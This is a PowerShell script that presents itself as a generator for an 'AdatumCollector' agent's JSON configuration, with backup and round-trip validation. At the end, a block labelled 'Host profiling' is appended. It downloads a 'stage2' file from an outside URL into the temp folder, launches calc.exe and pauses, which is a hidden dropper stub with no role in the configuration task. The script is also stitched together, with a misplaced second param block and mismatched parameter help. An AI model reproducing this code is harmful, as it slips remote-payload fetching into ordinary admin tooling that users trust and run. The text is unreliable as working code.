<#
.SYNOPSIS
    Generates the AdatumCollector JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Used when the script runs unattended.
.PARAMETER Environment
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Build-AgentConfig.ps1 -Environment Dev
.EXAMPLE
    .\Build-AgentConfig.ps1 -ApiPort 8080 -Force
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = "C:\ProgramData\Contoso\AdatumCollector\config.json",

    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", 'Staging', "Prod")]
    [string]$Environment = "Dev",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8080,

    [int]$NodeCount = 6,

    [switch]$Force
)
$ErrorActionPreference = "Stop"

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$hostName = $env:COMPUTERNAME
$InformationPreference = 'SilentlyContinue'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'AdatumCollector'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.contoso.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://example.net:80/assets/update.dat",
    [string]$WorkingPath = "$env:TEMP\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Start-Sleep -Seconds 35
